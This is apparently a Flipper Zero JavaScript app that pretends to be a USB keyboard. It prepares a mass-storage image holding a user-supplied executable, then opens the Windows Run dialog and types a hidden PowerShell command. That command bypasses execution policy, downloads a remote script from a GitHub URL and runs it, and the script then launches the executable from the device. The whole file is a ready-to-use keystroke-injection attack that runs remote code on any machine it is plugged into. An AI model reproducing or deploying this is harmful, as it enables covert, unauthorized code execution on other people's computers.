let layout = "en-US"; // more layouts found in README
let scriptName = "script.exe";
//let scriptName = undefined;
// undefined = script.exe (default)
let textbox = require("textbox");
let usbdisk = require("usbdisk");
let storage = require("storage");
let badusb = require("badusb");
let notify = require("notification");
let submenu = require("submenu");
let dialog = require("dialog");
let sizes = [64, 128, 256, 512];
submenu.setHeader("What size for img?");
for (let i = 0; i < sizes.length; i++) {
  submenu.addItem(to_string(sizes[i]) + "MB", sizes[i]);
}
let imgSize = submenu.show();
textbox.setConfig("end", "text");
textbox.emptyText();
// Non-blocking, can keep updating text after, can close in JS or in GUI
textbox.show();
if (typeof imgSize !== "number") {
  die("No image size selected");
}
let diskPath = "/ext/apps_data/mass_storage/" + to_string(imgSize) + "MB.img";
textbox.addText("Img size: " + to_string(imgSize) + "mb\n");

if (!storage.exists(diskPath)) {
  textbox.addText("Creating image...\n");
  usbdisk.createImage(diskPath, imgSize * 1024 * 1024);
  usbdisk.start(diskPath);
  notify.error();
  while (
    !dialog.message(
      "Add executable",
      "Press OK when executable is added. Follow instructions."
    )
  ) {
    delay(250);
  }
  notify.success();
  usbdisk.stop();
}

textbox.addText("Starting badusb...\n");

badusb.setup({
  vid: 0xaaaa,
  pid: 0xbbbb,
  mfr_name: "Flipper",
  prod_name: "Zero",
  layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl",
});
// Wait until connected
textbox.addText("Connect device to USB\n");
while (!badusb.isConnected()) {
  notify.blink("red", "short");
  delay(1000);
}

// After connected
textbox.addText("USB is connected\n");
notify.success();
badusb.press("GUI", "r");
delay(500);
if (scriptName) {
  badusb.println(
    "powershell -w h -Ep Bypass $scriptName='" +
      scriptName +
      "';irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/JS/Script-runner/Run-script.ps1 | iex"
  );
} else {
  badusb.println(
    "powershell -w h -Ep Bypass irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/JS/Script-runner/Run-script.ps1 | iex"
  );
}

badusb.quit();
delay(4000);
textbox.addText("Running script\n");
usbdisk.start(diskPath);
notify.success();
while (!usbdisk.wasEjected()) {
  notify.blink("green", "short");
  delay(250);
}
textbox.addText("Ejected, stopping UsbDisk...\n");
usbdisk.stop();
textbox.addText("Done\n");
textbox.addText("Press back to exit");
notify.success();
for (let i = 0; i < 5; i++) {
  notify.blink("green", "short");
  delay(100);
}
while (textbox.isOpen()) {
  delay(100);
}
